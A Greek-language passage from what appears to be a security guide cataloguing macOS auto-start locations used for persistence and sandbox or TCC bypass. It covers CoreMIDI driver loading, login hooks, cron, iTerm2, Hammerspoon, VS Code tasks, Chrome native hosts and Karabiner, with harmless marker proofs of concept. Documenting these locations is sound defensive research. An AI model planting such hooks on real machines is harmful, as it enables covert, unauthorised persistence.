  - **Ενεργοποίηση**: Ο διακομιστής Core Audio φορτώνει ένα συμβατό HAL device plug-in· η επανεκκίνηση του διακομιστή μπορεί να προκαλέσει νέα αναζήτηση
- **`/Library/Audio/Plug-ins/Components`**
  - Απαιτείται root
  - **Ενεργοποίηση**: Ένας audio host εντοπίζει και δημιουργεί το εγκατεστημένο Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Ενεργοποίηση**: Ένας audio host εντοπίζει και δημιουργεί το εγκατεστημένο Audio Unit
- **`/System/Library/Components`**
  - Τοποθεσία που παρέχεται από την Apple και προστατεύεται από το σύστημα
  - **Ενεργοποίηση**: Ένας audio host δημιουργεί ένα αντίστοιχο system component

#### Περιγραφή

Σύμφωνα με τα προηγούμενα writeups, είναι δυνατό να **μεταγλωττίσετε ορισμένα audio plugins** και να φορτωθούν.<sup>[[6]](#references)[[7]](#references)</sup>

Τα HAL device plug-ins και τα Audio Units χρησιμοποιούν διαφορετικές διαδρομές φόρτωσης. Ο [οδηγός φιλοξενίας Audio Unit της Apple](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) αναφέρει ότι ένας host πρέπει να εντοπίσει και να δημιουργήσει ένα component· η αντιγραφή του σε έναν κατάλογο σάρωσης ή η επανεκκίνηση του `coreaudiod` δεν αποδεικνύει από μόνη της ότι εκτελέστηκε. Τα AUv2 plug-ins εκτελούνται στη διεργασία του host, ενώ οι [τρέχουσες οδηγίες της Apple για το Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) αναφέρουν ότι το AUv3 εκτελείται εξ ορισμού σε ξεχωριστή διεργασία στο macOS. Οι περιορισμοί υπογραφής, sandbox και library validation εξαρτώνται από τον host. Δεν εγκαταστάθηκε ούτε εκτελέστηκε audio plug-in στο Mac της έρευνας.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ο κώδικάς σας εκτελείται μέσα στη διεργασία `MIDIServer`, όχι στο sandbox της εφαρμογής σας
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Το `MIDIServer` εκτελείται με το δικό του προφίλ sandbox `seatbelt`

#### Τοποθεσία

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Δεν απαιτείται root (εγγράψιμο από τον χρήστη)
  - **Ενεργοποίηση**: Το `MIDIServer` ξεκινά (ξανά). Εκκινείται κατ' απαίτηση την πρώτη φορά που οποιαδήποτε διεργασία χρησιμοποιεί το CoreMIDI (με το άνοιγμα του *Audio MIDI Setup*, του GarageBand, ενός DAW ή μιας σελίδας που χρησιμοποιεί WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Απαιτείται root
  - **Ενεργοποίηση**: Όπως παραπάνω

#### Περιγραφή & Εκμετάλλευση

Το `MIDIServer` της Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) φορτώνει bundles MIDI **driver** από τους καταλόγους `Audio/MIDI Drivers`. Το binary είναι υπογεγραμμένο από την Apple, αλλά διαθέτει το entitlement `com.apple.security.cs.disable-library-validation`, επομένως θα φορτώσει ένα bundle που είναι **ανυπόγραφο ή ad-hoc υπογεγραμμένο από διαφορετική ομάδα**, επιτρέποντας την εκτέλεση κώδικα μέσα σε ξεχωριστή διεργασία που ανήκει στην Apple, **χωρίς root**.<sup>[[53]](#references)</sup>

Επαληθεύτηκε σε macOS 26 (μόνο για ανάγνωση):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Ένας driver είναι ένα τυπικό bundle που εξάγει ένα factory `MIDIDriverInterface`· αν τοποθετήσεις το payload στο factory/constructor, θα εκτελεστεί μόλις το `MIDIServer` απαριθμήσει τους drivers. Κάνε build, τοποθέτησέ το ως `~/Library/Audio/MIDI Drivers/Evil.plugin` και ενεργοποίησε τη φόρτωσή του χωρίς logout/reboot:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Πρόσθετα QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Ενδέχεται να αποκτήσετε επιπλέον πρόσβαση μέσω TCC

#### Τοποθεσία

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Περιγραφή & Εκμετάλλευση

Τα πρόσθετα QuickLook μπορούν να εκτελεστούν όταν **ενεργοποιείτε την προεπισκόπηση ενός αρχείου** (πατήστε το πλήκτρο διαστήματος ενώ το αρχείο είναι επιλεγμένο στο Finder) και είναι εγκατεστημένο ένα **πρόσθετο που υποστηρίζει αυτόν τον τύπο αρχείου**.<sup>[[8]](#references)</sup>

Μπορείτε να μεταγλωττίσετε το δικό σας πρόσθετο QuickLook, να το τοποθετήσετε σε μία από τις προηγούμενες τοποθεσίες για να φορτωθεί και, στη συνέχεια, να μεταβείτε σε ένα υποστηριζόμενο αρχείο και να πατήσετε το πλήκτρο διαστήματος για να το ενεργοποιήσετε.

Αυτές οι διαδρομές αφορούν παλαιότερα πακέτα `.qlgenerator`· ο [οδηγός αρχιτεκτονικής Quick Look της Apple](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) τεκμηριώνει τη σειρά αναζήτησης και τους τύπους αρχείων που αντιστοιχίζονται. Οι σύγχρονες **επεκτάσεις εφαρμογών** Quick Look περιλαμβάνονται σε εφαρμογές και έχουν διαφορετικούς κανόνες καταχώρισης και εκτέλεσης. Η παρουσία ενός generator δεν αποδεικνύει ότι αυτός θα επιλεγεί για τον συγκεκριμένο τύπο ή ότι ο κώδικάς του εκτελείται στο ίδιο το Finder. Η διαδρομή παλαιού τύπου για generator ελέγχθηκε μέσω τεκμηρίωσης και παρουσίας καταλόγων· κανένας generator δεν ήταν εγκατεστημένος ή φορτωμένος στο Mac της έρευνας.

### ~~Άγκιστρα σύνδεσης/αποσύνδεσης~~

> [!CAUTION]
> Αυτό δεν λειτούργησε για μένα, ούτε με το LoginHook του χρήστη ούτε με το LogoutHook του root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Πρέπει να μπορείτε να εκτελέσετε κάτι όπως `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`cated στο `~/Library/Preferences/com.apple.loginwindow.plist`

Είναι παρωχημένα, αλλά μπορούν να χρησιμοποιηθούν για την εκτέλεση εντολών όταν συνδέεται ένας χρήστης.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Αυτή η ρύθμιση αποθηκεύεται στο `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Για να το διαγράψετε:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Ο χρήστης root αποθηκεύεται στο **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Υπό όρους sandbox bypass

> [!TIP]
> Εδώ θα βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass**, που σας επιτρέπουν να εκτελέσετε κάτι απλώς **γράφοντάς το σε ένα αρχείο** και **βασιζόμενοι σε όχι και τόσο συνηθισμένες συνθήκες**, όπως την εγκατάσταση συγκεκριμένων **προγραμμάτων, «ασυνήθιστες» ενέργειες χρήστη** ή συγκεκριμένα περιβάλλοντα.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ωστόσο, πρέπει να μπορείτε να εκτελέσετε το binary `crontab`
  - Ή να είστε root
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/usr/lib/cron/tabs/`**
  - Απαιτείται root για άμεση πρόσβαση εγγραφής. Δεν απαιτείται root αν μπορείτε να εκτελέσετε `crontab <file>`
  - **Ενεργοποίηση**: Το πρόγραμμα εκτέλεσης που έχει οριστεί στο εγκατεστημένο crontab. Τα `at` και `periodic` είναι ξεχωριστοί μηχανισμοί που περιγράφονται παρακάτω.

#### Περιγραφή & Εκμετάλλευση

Εμφανίστε τις εργασίες cron του **τρέχοντος χρήστη** με:

```bash
crontab -l
```

Το launchd plist του system cron daemon έχει μια καταχώριση `QueueDirectories` για το `/usr/lib/cron/tabs`· εκεί αποθηκεύονται τα εγκατεστημένα crontab των χρηστών. Για να ελέγξετε τα crontab άλλων χρηστών, απαιτούνται δικαιώματα root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Σε έναν αναλώσιμο λογαριασμό, μπορεί να εγκατασταθεί μια εγγραφή cron που περιέχει μόνο έναν δείκτη με το `crontab` και να αφαιρεθεί αφού παρατηρηθεί. Η εκτέλεση του `crontab <file>` **αντικαθιστά ολόκληρο το υπάρχον crontab του λογαριασμού**, επομένως αποθηκεύστε το και επαναφέρετέ το αν ο λογαριασμός δεν είναι αναλώσιμος:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Το iTerm2 συνήθιζε να έχει εκχωρημένα δικαιώματα TCC

#### Τοποθεσίες

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Ενεργοποίηση**: Εκκινήστε το iTerm2 με ένα επιλέξιμο script Python API σε αυτόν τον φάκελο
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Ενεργοποίηση**: Εκκινήστε το iTerm2· το hook εκκίνησης AppleScript τεκμηριώνεται ξεχωριστά
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Ενεργοποίηση**: Δημιουργήστε μια συνεδρία με το profile του οποίου η εντολή ή το αρχικό κείμενο εκτελεί το payload

#### Περιγραφή και εκμετάλλευση

Ο [τρέχων οδηγός iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) τεκμηριώνει scripts **Python** αυτόματης εκτέλεσης στο `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Δεν τεκμηριώνει ότι εκτελείται ένα αυθαίρετο εκτελέσιμο αρχείο `.sh` σε αυτόν τον φάκελο. Για έναν προσωρινό λογαριασμό, αποθηκεύστε το παρακάτω ως `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Ο [τρέχων οδηγός AppleScript του iTerm2](https://iterm2.com/documentation-scripting.html) τεκμηριώνει ξεχωριστά το `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, με εφεδρική χρήση του παλαιότερου `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` όταν ο σύγχρονος φάκελος δεν υπάρχει. Ένα AppleScript που περιέχει μόνο έναν δείκτη είναι:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Αυτά τα παραδείγματα script ελέγχθηκαν με βάση την τεκμηρίωση του iTerm2, αλλά δεν εκτελέστηκαν στην ενεργή συνεδρία desktop. Αφού τα δοκιμάσετε σε έναν προσωρινό λογαριασμό, αφαιρέστε το δοκιμαστικό script και το `/tmp/ht-iterm-autolaunch-marker` ή το `/tmp/iterm2-autolaunchscpt`, αντίστοιχα.

Οι προτιμήσεις του iTerm2 που βρίσκονται στο **`~/Library/Preferences/com.googlecode.iterm2.plist`** μπορούν να καθορίσουν μια εντολή profile ή αρχικό κείμενο. Το τελευταίο πληκτρολογείται σε μια συνεδρία· η εκτέλεσή του εξαρτάται από το αν το ερμηνεύει ένα shell. [Η τεκμηρίωση των profile του iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) περιγράφει την εντολή που εκτελείται όταν δημιουργείται μια νέα συνεδρία με αυτό το profile.

Αυτή η ρύθμιση μπορεί να διαμορφωθεί στις ρυθμίσεις του iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Και η εντολή εμφανίζεται στις προτιμήσεις:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Για μια ασφαλή αξιολόγηση, επιθεωρήστε το επιλεγμένο προφίλ στις ρυθμίσεις του iTerm2 ή διαβάστε ένα αντίγραφο του αρχείου προτιμήσεών του. Η αλλαγή του `Initial Text` σε ένα ενεργό προφίλ θα επηρέαζε τις συνεδρίες ενός χρήστη, επομένως δεν άλλαξε καμία προτίμηση στο Mac που χρησιμοποιήθηκε για την έρευνα.

### xbar

Συγγραφή: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά πρέπει να είναι εγκατεστημένο το xbar
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ζητά δικαιώματα προσβασιμότητας

#### Τοποθεσία

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Ενεργοποίηση**: Όταν εκκινηθεί το xbar

#### Περιγραφή

Αν είναι εγκατεστημένο το δημοφιλές πρόγραμμα [**xbar**](https://github.com/matryer/xbar), είναι δυνατό να γραφτεί ένα shell script στο **`~/Library/Application\ Support/xbar/plugins/`**, το οποίο θα εκτελεστεί κατά την εκκίνηση του xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά πρέπει να είναι εγκατεστημένο το Hammerspoon
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ζητά δικαιώματα Accessibility

#### Τοποθεσία

- **`~/.hammerspoon/init.lua`**
  - **Trigger**: Μόλις εκτελεστεί το hammerspoon

#### Περιγραφή

Το [**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) λειτουργεί ως πλατφόρμα αυτοματισμού για το **macOS**, αξιοποιώντας τη **γλώσσα σεναρίων LUA**. Αξιοσημείωτο είναι ότι υποστηρίζει την ενσωμάτωση πλήρους κώδικα AppleScript και την εκτέλεση shell scripts, ενισχύοντας σημαντικά τις δυνατότητες σεναρίων του.<sup>[[13]](#references)</sup>

Η εφαρμογή αναζητά ένα μόνο αρχείο, το `~/.hammerspoon/init.lua`, και κατά την εκκίνηση εκτελείται το script.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά πρέπει να είναι εγκατεστημένο το BetterTouchTool
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ζητά δικαιώματα Automation-Shortcuts και Accessibility

#### Τοποθεσία

- Ένα αρχείο script που **αναφέρεται ήδη** από ένα ενεργοποιημένο preset του BetterTouchTool ή η διαμόρφωση αυτού του preset στο `~/Library/Application Support/BetterTouchTool/`. Η ακριβής διαδρομή του script εξαρτάται από τη διαμόρφωση του preset.

Η [αναφορά ενεργειών του BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) τεκμηριώνει ενέργειες shell-script και background-command. Το διαμορφωμένο πληκτρολόγιο, ποντίκι, touch, widget ή άλλο συμβάν πρέπει να συμβεί όταν είναι ενεργό το σχετικό preset· ο [οδηγός ενεργοποίησης](https://docs.folivora.ai/docs/configuration/new-trigger/) δείχνει πώς συνδυάζονται. Ένα τυχαίο αρχείο στον κατάλογο υποστήριξης εφαρμογών δεν αποτελεί trigger. Μια ήδη διαμορφωμένη ενέργεια που φορτώνει ένα εξωτερικό εγγράψιμο script αποτελεί πιο συγκεκριμένο στόχο write-to-execution. Ο κώδικας εκτελείται με τον λογαριασμό του χρήστη του BetterTouchTool, σύμφωνα με τα πραγματικά δικαιώματα macOS που διαθέτει. Το BetterTouchTool δεν υπήρχε στο `/Applications` στον Mac της έρευνας, επομένως δεν τροποποιήθηκε ούτε εκτελέστηκε τοπικά κανένα preset.

### Alfred

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά πρέπει να είναι εγκατεστημένο το Alfred
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ζητά δικαιώματα Automation, Accessibility, ακόμη και Full-Disk access

#### Τοποθεσία

- Ένα script ή αρχείο που **αναφέρεται ήδη** από ένα εγκατεστημένο workflow του Alfred ή αυτό το workflow μέσα στον διαμορφωμένο κατάλογο `Alfred.alfredpreferences` του χρήστη. Ο κατάλογος προτιμήσεων μπορεί να συγχρονίζεται και δεν έχει μία σταθερή, καθολική διαδρομή.

Ο [οδηγός workflow του Alfred](https://www.alfredapp.com/help/workflows/) περιγράφει την προϋπόθεση του Powerpack και την εγκατάσταση μέσω του περιβάλλοντος χρήστη. Πρέπει να ενεργοποιηθεί το hotkey, keyword ή άλλο διαμορφωμένο trigger ενός εγκατεστημένου workflow· το [παράδειγμα hotkey του Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) παρουσιάζει μια ενέργεια script. Η [αναφορά περιβάλλοντος του Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) παρέχει τη διαδρομή προτιμήσεων που έχει επιλεγεί, μέσω του `alfred_preferences`. Η απόθεση ενός μη καταχωρισμένου αρχείου workflow σε έναν αυθαίρετο κατάλογο δεν αποδεικνύει ότι θα εγκατασταθεί ή θα εκτελεστεί. Ο κώδικας εκτελείται ως ο συνδεδεμένος χρήστης του Alfred, με τα πραγματικά δικαιώματα macOS που διαθέτει. Το Alfred δεν υπήρχε στο `/Applications` στον Mac της έρευνας, επομένως αυτή η διαδρομή αξιολογήθηκε μόνο βάσει της τεκμηρίωσης.

### Εντολές Script του Raycast και ανανέωση extension

- **Στόχος εγγραφής:** Ένα εκτελέσιμο script σε έναν κατάλογο που **έχει ήδη προστεθεί** στις Ρυθμίσεις Raycast → Script Commands. Το Raycast δεν σαρώνει έναν αυθαίρετο νέο κατάλογο. Ο [οδηγός Script Commands του Raycast](https://manual.raycast.com/script-commands) τεκμηριώνει την καταχώριση καταλόγου.
- **Trigger και ταυτότητα:** Ο χρήστης εκτελεί την ευρετηριασμένη εντολή, ένα διαμορφωμένο hotkey ή fallback την ενεργοποιεί ή το Raycast ανανεώνει ένα script `inline` σύμφωνα με το διαμορφωμένο `@raycast.refreshTime`. Το script εκτελείται ως ο συνδεδεμένος χρήστης του Raycast μέσω του interpreter του. Η [αναφορά μεταδεδομένων upstream](https://github.com/raycast/script-commands#metadata) περιορίζει την αυτόματη ανανέωση σε εντολές inline, ενώ το [manifest extension του Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) υποστηρίζει ξεχωριστά ένα `interval` για εγκατεστημένες εντολές extension τύπου `no-view` ή `menu-bar`. Η απλή προσθήκη μιας κανονικής εντολής script δεν την προγραμματίζει για εκτέλεση.

Για έναν προσωρινό λογαριασμό με καταχωρισμένο κατάλογο script, ένα inline script που δημιουργεί μόνο ένα marker είναι:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Αποθηκεύστε το στον καταχωρισμένο κατάλογο, κάντε το εκτελέσιμο και αφήστε το Raycast να ανανεωθεί. Έπειτα αφαιρέστε αυτό το αρχείο και το `/tmp/ht-raycast-refresh-marker`. Το Raycast δεν εντοπίστηκε με το συνηθισμένο του όνομα στο `/Applications` στον Mac της έρευνας, επομένως αυτό βασίζεται στην τεκμηρίωση και δεν εκτελέστηκε τοπικά. Η πρόσβαση, ο αυτοματισμός και οι άδειες πρόσβασης σε αρχεία εξακολουθούν να υπόκεινται στα αιτήματα άδειας του macOS.

### Αυτόματες εργασίες workspace στο Visual Studio Code

- **Στόχος εγγραφής:** `.vscode/tasks.json` μέσα σε ένα workspace που θα ανοίξει ο χρήστης.
- **Ενεργοποίηση:** Κατά το άνοιγμα αυτού του workspace στο VS Code, αλλά μόνο αν ο φάκελος είναι έμπιστος **και** έχουν επιτραπεί οι αυτόματες εργασίες. Ένα μη έμπιστο workspace δεν εκτελεί ποτέ αυτόματες εργασίες· η προεπιλεγμένη ρύθμιση ζητά από τον χρήστη να επιτρέψει την πρώτη αυτόματη εκτέλεση. Η [τεκμηρίωση εργασιών του VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) και η [τεκμηρίωση του Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) περιγράφουν και τις δύο προϋποθέσεις.
- **Ταυτότητα εκτέλεσης:** Ο λογαριασμός του χρήστη του VS Code, μέσω της διαμορφωμένης διεργασίας εργασίας. Πρόκειται για εκτέλεση ειδική για την εφαρμογή και όχι για persistence κατά τη σύνδεση.

Σε ένα **νέο, προσωρινό workspace**, τοποθετήστε αυτή την εργασία που δημιουργεί μόνο ένα marker στο `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Αφού ανοίξετε το έμπιστο περιβάλλον εργασίας και επιτρέψετε τις αυτόματες εργασίες, ελέγξτε για το `.autostart-task-ran`. Αφαιρέστε την εγγραφή της εργασίας και τον δείκτη για να καθαρίσετε. **Αυτό επαληθεύτηκε με βάση την τεκμηρίωση της Microsoft και το εγκατεστημένο πακέτο VS Code 1.139.1· δεν εκτελέστηκε στην ενεργή συνεδρία επιφάνειας εργασίας.**

### Chrome native messaging hosts

- **Προορισμός εγγραφής:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` για τον τρέχοντα χρήστη ή `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` για όλους τους χρήστες (απαιτούνται δικαιώματα εγγραφής διαχειριστή). Τα Chromium και Chrome for Testing χρησιμοποιούν διαφορετικούς καταλόγους· δείτε τον [τρέχοντα πίνακα διαδρομών του Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Ενεργοποίηση:** Μια εγκατεστημένη επέκταση Chrome με το δικαίωμα `nativeMessaging` καλεί τις `chrome.runtime.connectNative()` ή `chrome.runtime.sendNativeMessage()` χρησιμοποιώντας το ακριβές όνομα host του manifest. Στη συνέχεια, το Chrome εκκινεί το εκτελέσιμο του host. Το άνοιγμα του Chrome από μόνο του δεν εκτελεί αυθαίρετα έναν νέο native host· η δημιουργία ενός manifest χωρίς επέκταση που το καλεί δεν κάνει τίποτα. Ο [οδηγός native messaging του Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) περιγράφει αυτήν την ανταλλαγή.
- **Ταυτότητα εκτέλεσης:** Ο λογαριασμός του χρήστη του Chrome. Το manifest πρέπει να καθορίζει μια απόλυτη διαδρομή εκτελέσιμου και να επιτρέπει ρητά το origin της επέκτασης που το καλεί.

Σε έναν προσωρινό λογαριασμό browser με μια δοκιμαστική επέκταση, το ακόλουθο ζεύγος αρχείων δείχνει τη σύνδεση εγγραφής-προς-εκτέλεση. Το όνομα αρχείου του manifest πρέπει να αντιστοιχεί στο `name` του, ενώ το `TEST_EXTENSION_ID` πρέπει να αντικατασταθεί από το πραγματικό ID αυτής της επέκτασης:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Αποθηκεύστε αυτό το JSON ως `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Το εκτελέσιμο που χρησιμοποιείται μόνο ως marker στη διαδρομή `path` του manifest μπορεί να περιέχει:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Αφού η δοκιμαστική επέκταση καλέσει την `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` από το service worker ή τη σελίδα της επέκτασης, το marker αποδεικνύει ότι έγινε εκκίνηση του host. Αυτός ο ελάχιστος host δεν υλοποιεί το πρωτόκολλο απόκρισης του Chrome με πρόθεμα μήκους, επομένως η επέκταση μπορεί να αναφέρει σφάλμα ανταλλαγής μηνυμάτων μετά τη δημιουργία του marker. Αφαιρέστε το δοκιμαστικό manifest, τον host και το marker για καθαρισμό. Στο macOS 26.5.2, η εφαρμογή Chrome και οι δύο κατάλογοι manifest υπήρχαν· **το ενεργό προφίλ Chrome δεν τροποποιήθηκε ούτε χρησιμοποιήθηκε**.

### Εντολές συμβάντων πλήκτρων Karabiner-Elements

- **Στόχος εγγραφής:** `~/.config/karabiner/karabiner.json` σε λογαριασμό όπου είναι εγκατεστημένο και εκτελείται το Karabiner-Elements. Ο [οδηγός τοποθεσίας αρχείων του Karabiner](https://karabiner-elements.pqrs.org/docs/json/location/) αναφέρει ότι η εφαρμογή παρακολουθεί αυτό το αρχείο και το φορτώνει ξανά μετά από εγγραφή. Τα αρχεία JSON στο `assets/complex_modifications` είναι μόνο εισαγώγιμες προεπιλογές· η απλή εγγραφή ενός αρχείου εκεί δεν ενεργοποιεί κάποιον κανόνα.
- **Ενεργοποίηση:** Το διαμορφωμένο συμβάν πλήκτρου μετά την ενεργοποίηση του κανόνα. Η [αναφορά `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) περιγράφει την εκτέλεση εντολών. Αυτό δεν είναι εκτέλεση κώδικα κατά τη σύνδεση ή σε κάθε εγγραφή αρχείου.
- **Ταυτότητα εκτέλεσης:** Ο συνδεδεμένος χρήστης που εκτελεί τη διεργασία χρήστη του Karabiner. Τα δικαιώματα της εφαρμογής και τυχόν πρόσβαση TCC εξαρτώνται από την εφαρμογή και την έκδοση.

Για έναν προσωρινό δοκιμαστικό λογαριασμό, προσθέστε αυτό το αντικείμενο κανόνα στον πίνακα `complex_modifications.rules` του επιλεγμένου προφίλ στο `karabiner.json`, διατηρώντας το υπόλοιπο προφίλ. Πατήστε F18 για να δημιουργήσετε ένα ακίνδυνο marker και, στη συνέχεια, αφαιρέστε αυτόν τον κανόνα και το marker. Η επιλογή του F18 αποφεύγει την αντικατάσταση ενός συνηθισμένου πλήκτρου πληκτρολόγησης:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

